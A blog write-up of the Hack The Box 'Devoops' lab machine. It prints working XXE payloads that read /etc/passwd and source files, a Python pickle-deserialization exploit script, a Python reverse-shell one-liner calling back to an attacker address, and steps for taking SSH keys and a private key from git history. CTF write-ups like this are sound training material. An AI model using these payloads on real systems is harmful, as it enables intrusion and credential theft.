---
title:  "Hackthebox - Devoops"
date:   2018-10-15 21:30:18 +0100
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-devoops.png" alt="Info Card" %}

## user

In order to find out which ports are open, I used [nmap](https://tools.kali.org/information-gathering/nmap):

```bash
# Nmap 7.70 scan initiated Sun Aug 26 16:26:05 2018 as: nmap -sV -sC -oA nmap 10.10.10.91
Nmap scan report for 10.10.10.91
Host is up (0.081s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 26 16:26:21 2018 -- 1 IP address (1 host up) scanned in 15.78 seconds
```

When visiting the URL `http://10.10.10.91:5000` in the browser, the following text showed up:

```bash
Under construction!

This is feed.py, which will become the MVP for Blogfeeder application.

TODO: replace this with the proper feed from the dev.solita.fi backend.
```

Below this, a (badly aligned) screenshot of a blog which is served from `/feed` was shown.

Finding hidden paths in the webapp (port 5000) with `dirb` (standard wordlist) yielded the following results:

```bash
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: output.dirb
START_TIME: Sun Aug 26 16:29:08 2018
URL_BASE: http://10.10.10.91:5000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.91:5000/ ----
+ http://10.10.10.91:5000/upload (CODE:200|SIZE:347)

-----------------
END_TIME: Sun Aug 26 16:45:31 2018
DOWNLOADED: 4612 - FOUND: 1
```

The site under `/upload` can be used for uploading blogposts. At the top of the page, the following sentence is displayed: `This is a test API! The final API will not have this functionality.` This indicates that the code might be not so well tested...

Blogposts can be uploaded using the XML format. A valid upload looks as follows:

```bash
<?xml version="1.0" encoding="utf-8"?>
<root>
<Author>Foo</Author>
<Subject>FooSubject</Subject>
<Content>FooContent</Content>
</root>
```

The uploaded file can be found again at `http://10.10.10.91:5000/uploads/valid.xml`:

```bash
PROCESSED BLOGPOST: Author: Foo Subject: FooSubject Content: FooContent URL for later reference: /uploads/valid2.xml File path: /home/roosa/deploy/src
```

This leaks the real directory on the server: `/home/roosa/deploy/src`. Furthermore, there must be a user `roosa` on the server.

The server is vulnerable to XXE, a fact that I verified by uploading the following XML file:

```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
<Author>Foo</Author>
<Subject>FooSubject</Subject>
<Content>&xxe;</Content>
</root>
```

The response from the server:

```bash
PROCESSED BLOGPOST: 
Author: Foo 
Subject: FooSubject 
Content: root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false 
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false 
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false 
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false 
syslog:x:104:108::/home/syslog:/bin/false 
_apt:x:105:65534::/nonexistent:/bin/false 
messagebus:x:106:110::/var/run/dbus:/bin/false 
uuidd:x:107:111::/run/uuidd:/bin/false 
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false 
whoopsie:x:109:117::/nonexistent:/bin/false 
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false 
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false 
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false 
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false 
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false 
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false 
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false 
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false 
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false 
saned:x:119:127::/var/lib/saned:/bin/false 
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false 
osboxes:x:1000:1000:osboxes.org,,,:/home/osboxes:/bin/false 
git:x:1001:1001:git,,,:/home/git:/bin/bash 
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash 
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin 
blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false 
URL for later reference: /uploads/extract-etc-passwd.xml File path: /home/roosa/deploy/src
```

The main website mentioned `feed.py` and the upload directory is `/home/roosa/deploy/src`. I tried to simply concatenate the path and hoped for the best... 

```bash
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///home/roosa/deploy/src/feed.py">]>
<root>
<Author>Foo</Author>
<Subject>FooSubject</Subject>
<Content>&xxe;</Content>
</root>	
```

Assuming that the file `feed.py` is in the same directory was correct and got me the following result: 

```bash
PROCESSED BLOGPOST: 
Author: Foo 
Subject: FooSubject Content: ') 
def uploaded_file(filename):
return send_from_directory(Config.UPLOAD_FOLDER, filename) 

@app.route("/") 
def xss(): 
	return template('index.html') 

@app.route("/feed") 
def fakefeed(): 
	return send_from_directory(".","devsolita-snapshot.png") 

@app.route("/newpost", methods=["POST"]) 
def newpost(): 
	# TODO: proper save to database, this is for testing purposes right now 
	picklestr = base64.urlsafe_b64decode(request.data) 
	# return picklestr 
	postObj = pickle.loads(picklestr) 
	return "POST RECEIVED: " + postObj['Subject'] 
	## TODO: VERY important! DISABLED THIS IN PRODUCTION 
	#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole') 
	# TODO: Replace run-gunicorn.sh with real Linux service script 
	# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole') 
	
if __name__ == "__main__": 
	app.run(host='0.0.0,0', Debug=True) 

URL for later reference: /uploads/extract-feed-py.xml File path: /home/roosa/deploy/src
```

Obviously, there is a route `/newpost` where the uploaded content gets deserialized using the Python `pickle` library. I rememebered that this can be used for RCE, if arbitrary objects get deserialized.

I wrote the following script to check whether RCE works:

```python
import base64
import cPickle
import os
import requests

cmd = "echo foobar > /tmp/mystuff"

class Exploit(object):
	def __reduce__(self):
	return(os.system,(cmd,))

def submit_exploit():
	data = base64.b64encode(cPickle.dumps(Exploit()))
	print("Submitting data: {}".format(data))
	response = requests.post("http://10.10.10.91:5000/newpost", data=data)
	print(response.status_code)
	print(response.text)


if __name__ == "__main__":
	submit_exploit()
```

Fetching `/tmp/mystuff` with the XXE exploit from above showed that the code is working as expected.

A reverse shell on the victim system can be obtained using the following script. I tried a few netcat reverse shells without success before using a plain Python solution. This worked prefectly (I should have had that idea earlier, because the webapplication itself is written in python...):

```python
import base64
import cPickle
import os
import requests
import subprocess

cmd = """python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ip>",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' &"""

class Exploit(object):
  def __reduce__(self):
	return (subprocess.Popen, (
	  (cmd),
	  0, # Bufsize
	  None, # exec
	  None, #stdin
	  None, #stdout
	  None, #stderr
	  None, #preexec
	  False, #close_fds
	  True, # shell
	  ))

def submit_exploit():
	data = base64.b64encode(cPickle.dumps(Exploit()))
	print("Submitting data: {}".format(data))
	response = requests.post("http://10.10.10.91:5000/newpost", data=data)
	print(response.status_code)
	print(response.text)

if __name__ == "__main__":
	submit_exploit()
```

On the attacker system, I had a netcat listener ready, which was started as follows:

```bash
$ nc -nlvp 1337
```

After the connection was established successfully, I could read the file `/home/roosa/user.txt`, which is the flag for owning user.


## root

The reverse shell is very limited. As the box has SSH running on port 22, searching for SSH keys of the current user under `/home/roosa/.ssh/` came into my mind. There was already a key pair on the system, which I simply copied to the attacker machine. Trying to login via SSH with `ssh -i id_rsa roosa@10.10.10.91` worked out of the box.

I searched a bit through the home directory of roosa and found a git repository in the `work` folder containing a private RSA key. Unfortunately, the key could not be used to connect to the box as root. I gave up on the key temporarily and tried to find other ways to escalate privileges.

There are a few great scripts that cover some basic checks, but the box did not have full internet access to download them directly from the source. In order to download scripts on the box, I used a Python HTTP server on the attacker system by issuing the following command inside the directory where the files that should be transmitted to the box were stored:

```bash
$ python -m SimpleHTTPServer 9999
```

As the box has `wget` installed, files could be simply copied to the target folder by issuing the following command:

```bash
$ wget http://<ip>:9999/<filename>
```

[LinEnum](https://github.com/rebootuser/LinEnum) is a nice tool for performing some basic checks. The bash history of the `roosa` user (`/home/roosa/.bash_history`) revealed some interesting content: There was a git repo at `/home/roosa/work/blogfeed` which synchronized with a git remote on the same machine at `/srv/git/blogfeed.git`. 

When looking through the git history of that repository, some interesting commit messages could be found:

```bash
$ git log
<snip>
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

	reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

	add key for feed integration from tnerprise backend
```

`git diff d387abf63e05c9628a59195cec9311751bdb283f` showed that a private RSA key was added to the repo at `resources/integration/authcredentials.key` instead of an already existing private RSA key. This commit was reverted one commit later. 

I copied the repo to `/tmp` to not destroy anything and used the command `git checkout d387abf63e05c9628a59195cec9311751bdb283f` in order to retrieve the "valid key" from that commit.

This key can be used for logging in via SSH as root to get the flag for owning root by opening `/root/root.txt`. 
